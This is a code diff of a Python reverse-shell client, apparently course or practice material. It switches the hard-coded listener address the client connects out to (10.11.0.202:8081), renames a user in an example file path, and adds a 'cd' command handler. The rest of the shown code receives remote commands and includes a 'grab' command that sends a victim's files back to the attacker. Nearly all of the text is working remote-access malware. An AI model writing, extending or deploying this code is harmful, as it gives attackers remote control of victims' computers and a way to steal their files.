@@ -26,7 +26,7 @@ def transfer(s,path):
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('192.168.1.39', 8081))
+    s.connect(('10.11.0.202', 8081))
  
     while True: 
         command =  s.recv(1024)
@@ -42,7 +42,7 @@ def connect():
 # store it into a varaible called path and pass it to transfer function
             
 # Remember the Formula is  grab*<File Path>
-# Example:  grab*C:\Users\Hussam\Desktop\photo.jpeg
+# Example:  grab*C:\Users\Ghost\Desktop\photo.jpeg
 
         elif 'grab' in command:            
             grab,path = command.split('*')
@@ -55,6 +55,10 @@ def connect():
                 s.send ( str(e) )  # send the exception error
                 pass
 
+        elif 'cd' in command: # the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
+            code,directory = command.split (' ') # split up the reiceved command based on space into two variables
+            os.chdir(directory) # changing the directory 
+            s.send( "[+] CWD Is " + os.getcwd() ) # we send back a string mentioning the new CWD Note, os.getcwd should stop it from hanging
 
         
         else:
